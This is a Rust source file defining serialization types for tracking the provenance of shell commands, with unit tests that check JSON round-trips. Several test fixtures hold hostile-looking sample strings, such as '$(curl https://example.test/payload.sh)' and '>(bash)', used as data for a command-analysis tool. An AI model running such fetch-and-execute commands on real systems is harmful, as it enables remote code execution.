use serde::{Deserialize, Serialize};

use crate::{CommandSequenceNo, ResolvedPathPurpose, ResolvedPathRole, RuntimeProducedValueKind};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProvenanceEndpointKind {
    Url,
    HostPort,
    SocketPath,
    RemoteSpec,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProvenanceEndpointUsage {
    FetchSource,
    UploadTarget,
    ControlPlane,
    GenericEndpoint,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ProvenanceVariableValueState {
    ExactScalar {
        value: String,
    },
    RuntimeProduced {
        value: String,
        value_kind: RuntimeProducedValueKind,
    },
    OpaqueDynamic {
        repr: String,
    },
    RuntimeInput {
        source: RuntimeInputSource,
        capture: RuntimeInputCapture,
    },
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ProvenanceMaterializedValueState {
    ExactScalar {
        value: String,
    },
    RuntimeProduced {
        value: String,
        value_kind: RuntimeProducedValueKind,
    },
    MissingBinding {
        variable_name: String,
    },
    UnsupportedDynamicBinding {
        variable_name: String,
        repr: String,
    },
    UnsupportedDynamicText {
        text: String,
    },
    UnsafeUnquotedScalar {
        variable_name: String,
        value: String,
    },
    RequiresRuntimeInput {
        source: RuntimeInputSource,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuntimeInputSource {
    StdinPayload,
    StdinData,
    InteractiveSession,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ImplicitInputSource {
    StdinPayload,
    StdinData,
    InteractiveSession,
    InheritedEnvironment,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum RuntimeInputCapture {
    NotCaptured,
    Descriptor { descriptor: String },
    ContentRef { content_ref: String },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InlineShellContentCarrier {
    HereString,
    HereDoc,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProvenanceTransformKind {
    Encode,
    Decode,
    Encrypt,
    Decrypt,
    Hash,
    Compress,
    Decompress,
    Generic,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PackageManagerKind {
    Pip,
    Apt,
    Conan,
    Npm,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PackageLocatorKind {
    RegistryRef,
    LocalPath,
    DirectUrl,
    VcsUrl,
    RequirementFile,
    UnknownDynamic,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ProvenanceArtifact {
    PathContent {
        path: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        version: Option<u64>,
    },
    VariableValue {
        name: String,
        state: ProvenanceVariableValueState,
        exported: bool,
        version: u64,
    },
    InheritedEnvValue {
        name: String,
        state: ProvenanceVariableValueState,
        version: u64,
    },
    PipelineStream {
        root_command_sequence_no: CommandSequenceNo,
        pipeline_group_index: usize,
        stream_index: usize,
    },
    MaterializedValue {
        source_kind: String,
        state: ProvenanceMaterializedValueState,
        version: u64,
    },
    RuntimeInput {
        source: RuntimeInputSource,
        capture: RuntimeInputCapture,
        version: u64,
    },
    InlineShellContent {
        carrier: InlineShellContentCarrier,
        text: String,
        quoted: bool,
        node_kind: String,
        version: u64,
    },
    CommandSubstitutionOutput {
        expression: String,
        body_text: String,
        version: u64,
    },
    ProcessSubstitutionChannel {
        expression: String,
        body_text: String,
        operator: String,
        version: u64,
    },
    TransformOutput {
        transform_kind: ProvenanceTransformKind,
        normalized_command_name: String,
        root_command_sequence_no: CommandSequenceNo,
        pipeline_group_index: usize,
        stream_index: usize,
        version: u64,
    },
    NetworkEndpoint {
        endpoint: String,
        endpoint_kind: ProvenanceEndpointKind,
        usage: ProvenanceEndpointUsage,
    },
    ImportedPackage {
        manager: PackageManagerKind,
        locator: String,
        locator_kind: PackageLocatorKind,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        source_endpoint: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        source_path: Option<String>,
        version: u64,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProvenanceConsumeKind {
    PathRead,
    ScriptSource,
    InProcessCodeSource,
    StartupConfigSource,
    ProjectConfigSource,
    ToolConfigSource,
    TaskDefinitionSource,
    VariableExpansion,
    VariableBindingValue,
    NetworkEndpoint,
    PipelineInput,
    RuntimeInput,
    StdinExplicit,
    StdinImplicit,
    CommandString,
    TransformInput,
    PackageLocator,
    ImportedPackageLogic,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProvenanceProduceKind {
    PathWrite,
    VariableBinding,
    PipelineOutput,
    MaterializedValue,
    CommandSubstitutionOutput,
    ProcessSubstitutionOutput,
    TransformOutput,
    CwdState,
    ImportedPackage,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ProvenanceDomainLabel {
    Path {
        role: ResolvedPathRole,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        purpose: Option<ResolvedPathPurpose>,
    },
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum ProvenanceEdgeSemantics {
    Consume {
        consume_kind: ProvenanceConsumeKind,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        slot_name: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        normalized_command_name: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        domain_label: Option<ProvenanceDomainLabel>,
    },
    Produce {
        produce_kind: ProvenanceProduceKind,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        slot_name: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        normalized_command_name: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        domain_label: Option<ProvenanceDomainLabel>,
    },
}

#[cfg(test)]
mod tests {
    use super::{
        InlineShellContentCarrier, PackageLocatorKind, PackageManagerKind, ProvenanceArtifact,
        ProvenanceConsumeKind, ProvenanceDomainLabel, ProvenanceEdgeSemantics,
        ProvenanceEndpointKind, ProvenanceEndpointUsage, ProvenanceMaterializedValueState,
        ProvenanceProduceKind, ProvenanceTransformKind, ProvenanceVariableValueState,
        RuntimeInputCapture, RuntimeInputSource,
    };
    use crate::{CommandSequenceNo, ResolvedPathPurpose, ResolvedPathRole};
    use serde_json::json;

    #[test]
    fn provenance_artifact_uses_stable_json_contract() {
        let artifact = ProvenanceArtifact::VariableValue {
            name: "USER_CMD".to_string(),
            state: ProvenanceVariableValueState::ExactScalar {
                value: "echo ok".to_string(),
            },
            exported: true,
            version: 3,
        };

        let value =
            serde_json::to_value(&artifact).expect("expected provenance artifact to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "variable_value",
                "name": "USER_CMD",
                "state": {
                    "kind": "exact_scalar",
                    "value": "echo ok"
                },
                "exported": true,
                "version": 3
            })
        );

        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected provenance artifact to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn materialized_value_artifact_uses_typed_state_contract() {
        let artifact = ProvenanceArtifact::MaterializedValue {
            source_kind: "runtime_input:stdin_payload".to_string(),
            state: ProvenanceMaterializedValueState::RequiresRuntimeInput {
                source: RuntimeInputSource::StdinPayload,
            },
            version: 8,
        };

        let value =
            serde_json::to_value(&artifact).expect("expected provenance artifact to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "materialized_value",
                "source_kind": "runtime_input:stdin_payload",
                "state": {
                    "kind": "requires_runtime_input",
                    "source": "stdin_payload"
                },
                "version": 8
            })
        );

        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected provenance artifact to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn inherited_env_value_artifact_uses_stable_json_contract() {
        let artifact = ProvenanceArtifact::InheritedEnvValue {
            name: "USER_CMD".to_string(),
            state: ProvenanceVariableValueState::ExactScalar {
                value: "echo ok".to_string(),
            },
            version: 9,
        };

        let value =
            serde_json::to_value(&artifact).expect("expected inherited env artifact to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "inherited_env_value",
                "name": "USER_CMD",
                "state": {
                    "kind": "exact_scalar",
                    "value": "echo ok"
                },
                "version": 9
            })
        );

        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected inherited env artifact to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn runtime_input_variable_value_artifact_uses_stable_json_contract() {
        let artifact = ProvenanceArtifact::VariableValue {
            name: "USER_CMD".to_string(),
            state: ProvenanceVariableValueState::RuntimeInput {
                source: RuntimeInputSource::StdinData,
                capture: RuntimeInputCapture::Descriptor {
                    descriptor: "read USER_CMD".to_string(),
                },
            },
            exported: false,
            version: 10,
        };

        let value =
            serde_json::to_value(&artifact).expect("expected provenance artifact to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "variable_value",
                "name": "USER_CMD",
                "state": {
                    "kind": "runtime_input",
                    "source": "stdin_data",
                    "capture": {
                        "kind": "descriptor",
                        "descriptor": "read USER_CMD"
                    }
                },
                "exported": false,
                "version": 10
            })
        );

        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected provenance artifact to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn runtime_input_artifact_uses_stable_json_contract() {
        let artifact = ProvenanceArtifact::RuntimeInput {
            source: RuntimeInputSource::StdinPayload,
            capture: RuntimeInputCapture::NotCaptured,
            version: 11,
        };

        let value =
            serde_json::to_value(&artifact).expect("expected runtime input artifact to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "runtime_input",
                "source": "stdin_payload",
                "capture": {
                    "kind": "not_captured"
                },
                "version": 11
            })
        );

        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected runtime input artifact to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn inline_shell_content_artifact_uses_stable_json_contract() {
        let artifact = ProvenanceArtifact::InlineShellContent {
            carrier: InlineShellContentCarrier::HereDoc,
            text: "echo ok\n".to_string(),
            quoted: false,
            node_kind: "heredoc_body".to_string(),
            version: 12,
        };

        let value = serde_json::to_value(&artifact)
            .expect("expected inline shell content artifact to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "inline_shell_content",
                "carrier": "here_doc",
                "text": "echo ok\n",
                "quoted": false,
                "node_kind": "heredoc_body",
                "version": 12
            })
        );

        let roundtrip: ProvenanceArtifact = serde_json::from_value(value)
            .expect("expected inline shell content artifact to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn command_substitution_output_artifact_uses_stable_json_contract() {
        let artifact = ProvenanceArtifact::CommandSubstitutionOutput {
            expression: "$(curl https://example.test/payload.sh)".to_string(),
            body_text: "curl https://example.test/payload.sh".to_string(),
            version: 13,
        };

        let value = serde_json::to_value(&artifact)
            .expect("expected command substitution output artifact to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "command_substitution_output",
                "expression": "$(curl https://example.test/payload.sh)",
                "body_text": "curl https://example.test/payload.sh",
                "version": 13
            })
        );

        let roundtrip: ProvenanceArtifact = serde_json::from_value(value)
            .expect("expected command substitution output artifact to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn process_substitution_channel_artifact_uses_stable_json_contract() {
        let artifact = ProvenanceArtifact::ProcessSubstitutionChannel {
            expression: ">(bash)".to_string(),
            body_text: "bash".to_string(),
            operator: "output".to_string(),
            version: 14,
        };

        let value = serde_json::to_value(&artifact)
            .expect("expected process substitution artifact to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "process_substitution_channel",
                "expression": ">(bash)",
                "body_text": "bash",
                "operator": "output",
                "version": 14
            })
        );

        let roundtrip: ProvenanceArtifact = serde_json::from_value(value)
            .expect("expected process substitution artifact to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn transform_output_artifact_uses_stable_json_contract() {
        let artifact = ProvenanceArtifact::TransformOutput {
            transform_kind: ProvenanceTransformKind::Decode,
            normalized_command_name: "base64".to_string(),
            root_command_sequence_no: CommandSequenceNo::new(7),
            pipeline_group_index: 0,
            stream_index: 1,
            version: 1,
        };

        let value =
            serde_json::to_value(&artifact).expect("expected transform output to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "transform_output",
                "transform_kind": "decode",
                "normalized_command_name": "base64",
                "root_command_sequence_no": 7,
                "pipeline_group_index": 0,
                "stream_index": 1,
                "version": 1
            })
        );

        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected transform output to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn provenance_edge_semantics_uses_stable_json_contract() {
        let semantics = ProvenanceEdgeSemantics::Consume {
            consume_kind: ProvenanceConsumeKind::ScriptSource,
            slot_name: Some("script_file".to_string()),
            normalized_command_name: Some("bash".to_string()),
            domain_label: Some(ProvenanceDomainLabel::Path {
                role: ResolvedPathRole::Read,
                purpose: Some(ResolvedPathPurpose::ScriptSource),
            }),
        };

        let value =
            serde_json::to_value(&semantics).expect("expected provenance semantics to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "consume",
                "consume_kind": "script_source",
                "slot_name": "script_file",
                "normalized_command_name": "bash",
                "domain_label": {
                    "kind": "path",
                    "role": "read",
                    "purpose": "script_source"
                }
            })
        );

        let roundtrip: ProvenanceEdgeSemantics =
            serde_json::from_value(value).expect("expected provenance semantics to deserialize");

        assert_eq!(roundtrip, semantics);
    }

    #[test]
    fn produce_kind_serializes_to_snake_case() {
        let value = serde_json::to_value(ProvenanceProduceKind::CommandSubstitutionOutput)
            .expect("expected produce kind to serialize");

        assert_eq!(value, json!("command_substitution_output"));
    }

    #[test]
    fn process_substitution_produce_kind_serializes_to_snake_case() {
        let value = serde_json::to_value(ProvenanceProduceKind::ProcessSubstitutionOutput)
            .expect("expected process substitution produce kind to serialize");

        assert_eq!(value, json!("process_substitution_output"));
    }

    #[test]
    fn provenance_domain_label_roundtrips_through_json() {
        let label = ProvenanceDomainLabel::Path {
            role: ResolvedPathRole::Config,
            purpose: Some(ResolvedPathPurpose::StartupConfig),
        };

        let value =
            serde_json::to_value(&label).expect("expected provenance domain label to serialize");
        let roundtrip: ProvenanceDomainLabel =
            serde_json::from_value(value).expect("expected provenance domain label to deserialize");

        assert_eq!(roundtrip, label);
    }

    #[test]
    fn pipeline_stream_artifact_roundtrips() {
        let artifact = ProvenanceArtifact::PipelineStream {
            root_command_sequence_no: CommandSequenceNo::new(7),
            pipeline_group_index: 1,
            stream_index: 0,
        };

        let value = serde_json::to_value(&artifact).expect("expected pipeline stream to serialize");
        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected pipeline stream to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn imported_package_artifact_roundtrips() {
        let artifact = ProvenanceArtifact::ImportedPackage {
            manager: PackageManagerKind::Pip,
            locator: "git+https://example.test/pkg.git".to_string(),
            locator_kind: PackageLocatorKind::VcsUrl,
            source_endpoint: Some("git+https://example.test/pkg.git".to_string()),
            source_path: None,
            version: 0,
        };

        let value =
            serde_json::to_value(&artifact).expect("expected imported package to serialize");

        assert_eq!(
            value,
            json!({
                "kind": "imported_package",
                "manager": "pip",
                "locator": "git+https://example.test/pkg.git",
                "locator_kind": "vcs_url",
                "source_endpoint": "git+https://example.test/pkg.git",
                "version": 0
            })
        );

        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected imported package to deserialize");

        assert_eq!(roundtrip, artifact);
    }

    #[test]
    fn imported_package_edge_kinds_use_stable_wire_values() {
        assert_eq!(
            serde_json::to_value(ProvenanceConsumeKind::PackageLocator)
                .expect("expected consume kind to serialize"),
            json!("package_locator")
        );
        assert_eq!(
            serde_json::to_value(ProvenanceConsumeKind::ImportedPackageLogic)
                .expect("expected consume kind to serialize"),
            json!("imported_package_logic")
        );
        assert_eq!(
            serde_json::to_value(ProvenanceProduceKind::ImportedPackage)
                .expect("expected produce kind to serialize"),
            json!("imported_package")
        );
    }

    #[test]
    fn network_endpoint_artifact_roundtrips() {
        let artifact = ProvenanceArtifact::NetworkEndpoint {
            endpoint: "https://example.test/payload.sh".to_string(),
            endpoint_kind: ProvenanceEndpointKind::Url,
            usage: ProvenanceEndpointUsage::FetchSource,
        };

        let value =
            serde_json::to_value(&artifact).expect("expected network endpoint to serialize");
        let roundtrip: ProvenanceArtifact =
            serde_json::from_value(value).expect("expected network endpoint to deserialize");

        assert_eq!(roundtrip, artifact);
    }
}
